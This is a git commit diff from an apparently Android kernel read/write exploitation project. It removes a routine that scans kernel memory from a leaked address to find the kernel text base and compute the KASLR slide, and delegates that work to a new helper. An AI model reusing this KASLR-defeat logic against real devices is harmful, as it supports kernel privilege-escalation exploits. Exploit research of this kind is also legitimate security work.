55567ed3e8ee6f5403901af3fd5434c01dc013ef
David Riusech <v1X3Q0@gmail.com>
2022-09-30 05:41:31 -0400

    base stuff is now outside and in the dyn offset tooling, will work on the rest later but seemed to have too much variance

--- targkrw/krw.cpp
+++ targkrw/krw.cpp
@@ -11,47 +11,17 @@
 #include <krw_util.h>
 #include <drv_share.h>
 
-unsigned long off4Text[] =
-{
-   0x146e0000, // this is a branch instruction, obviously fluctuates between devices
-   0x00080000,
-   0x03102000, // this qword fluctuates between devices, this is the value for 3a, 4a is 0x2475000
-   0x0000000a, 0x00000000, 0x00000000, 0x00000000,
-   0x644d5241, 0x00000000, 0x00000000, 0x00000000,
-   0x00000000,
-};
-
 size_t g_kernelSlide = 0;
 size_t g_kernelBase = 0;
 
 int kernel_slide(size_t* a_kernelSlide)
 {
-   size_t leak_addr = 0;
-   size_t kAddrIter = 0;
-   size_t textBase = 0;
-   int i = 0;
-   size_t bufInterp[sizeof(off4Text) / sizeof(size_t)] = {0};
    int result = -1;
 
    FINISH_IF(g_kernelSlide != 0);
 
-   SAFE_BAIL(kernel_leak(&leak_addr) == -1);
-   // leak_addr = bufInterp[0];
+   SAFE_BAIL(kernel_base(NULL) == -1);
 
-   kAddrIter = leak_addr & PAGE_MASK;
-   for (i = 0; i < 0x400; i++)
-   {
-      kernel_read(bufInterp, sizeof(off4Text), kAddrIter);
-      if (memcmp(&bufInterp[1], &off4Text[1], sizeof(off4Text) - sizeof(size_t)) == 0)
-      {
-         textBase = kAddrIter;
-         break;
-      }
-      kAddrIter -= PAGE_SIZE;
-   }
-   
-   g_kernelSlide = textBase - ANDROID_KERNBASE;
-   g_kernelBase = textBase;
 finish:
    if (a_kernelSlide != 0)
    {
@@ -61,7 +31,7 @@ finish:
 fail:
 
    return result;
-}
+}   
 
 int kernel_base(size_t* a_kernelBase)
 {
@@ -69,8 +39,10 @@ int kernel_base(size_t* a_kernelBase)
 
    FINISH_IF(g_kernelBase != 0);
 
-   SAFE_BAIL(kernel_slide(NULL) == -1);
+   SAFE_BAIL(kBaseRoll(a_kernelBase) == -1);
 
+   g_kernelSlide = *a_kernelBase - ANDROID_KERNBASE;
+   g_kernelBase = *a_kernelBase;
 finish:
    if (a_kernelBase != 0)
    {
